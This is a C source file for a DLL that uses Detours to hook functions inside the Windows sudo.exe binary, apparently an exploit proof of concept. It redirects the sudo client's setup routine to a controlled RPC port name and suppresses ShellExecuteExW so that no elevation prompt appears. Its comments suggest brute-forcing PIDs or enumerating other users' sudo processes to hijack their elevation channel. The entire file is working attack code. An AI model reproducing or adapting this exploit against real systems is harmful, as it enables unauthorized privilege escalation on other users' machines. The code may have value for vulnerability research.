#include <windows.h>
#include <stdio.h>
#include <detours.h>

struct rust_str {
    unsigned int length;
    unsigned int reserved;
    BYTE* data;
};

const DWORD kClientDoElevationRequestOffset = 0x8ea50;
const DWORD kSetupClientOffset = 0x8e770;

typedef BOOL(__stdcall* fnShellExec_t)(SHELLEXECUTEINFOW*);
typedef unsigned long long (__fastcall*fnSetupClient_t)(const char *);

fnSetupClient_t OriginalSetupClient = NULL;

unsigned long long __fastcall HookedSetupClient(char *rpc_port_name) {
    // Specify an open RPC port.
    // The easiest way to reproduce this is to use windbg to hold the RPC socket open.
    // A more robust exploit would brute force this, either by just trying all valid PIDs
    // for the numbers or by enumerating running sudo.exe processes for other users using createtoolhelp32snapshot
    OutputDebugStringA("Using controlled sudo RPC socket");
    return OriginalSetupClient("sudo_elevate_9868");
}

BOOL HookedShellExecuteExW(SHELLEXECUTEINFOW* pExecInfo) {
    OutputDebugStringA("Not running shell exec...");
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
    if (DetourIsHelperProcess()) {
        return TRUE;
    }

    if (dwReason == DLL_PROCESS_ATTACH) {
        HMODULE target_process_handle = GetModuleHandle(NULL);
        char* debugOutput = (char*)malloc(256);
        snprintf(debugOutput, 256, "Got Module Handle %p\n", (void*)target_process_handle);
        OutputDebugStringA(debugOutput);
        OriginalSetupClient = (fnSetupClient_t)((unsigned long long)target_process_handle + kSetupClientOffset);
        snprintf(debugOutput, 256, "Attaching the hook to function at %p\n", (void*)OriginalSetupClient);
        OutputDebugStringA(debugOutput);

        HMODULE hShell32 = GetModuleHandleA("Shell32");
        snprintf(debugOutput, 256, "Got Shell32 Handle %p\n", (void*)hShell32);
        OutputDebugStringA(debugOutput);
        if (hShell32 == NULL) {
            free(debugOutput);
            return FALSE;
        }
        void* pShellExecuteExW = GetProcAddress(hShell32, "ShellExecuteExW");
        snprintf(debugOutput, 256, "ShellExec target fp %p\n", (void*)pShellExecuteExW);
        OutputDebugStringA(debugOutput);

        DetourRestoreAfterWith();
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourAttach(&(PVOID&)OriginalSetupClient, HookedSetupClient);
        DetourAttach(&(PVOID&)pShellExecuteExW, HookedShellExecuteExW);
        DetourTransactionCommit();
        snprintf(debugOutput, 256, "Hooked function at %p\n", (void*)HookedSetupClient);
        OutputDebugStringA(debugOutput);
        free(debugOutput);
    }
    else if (dwReason == DLL_PROCESS_DETACH) {
        HMODULE target_process_handle = GetModuleHandle(NULL);
        OriginalSetupClient = (fnSetupClient_t)GetProcAddress(target_process_handle, "SetupClient");
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourDetach(&(PVOID&)OriginalSetupClient, HookedSetupClient);
        DetourTransactionCommit();
    }
    return TRUE;
}
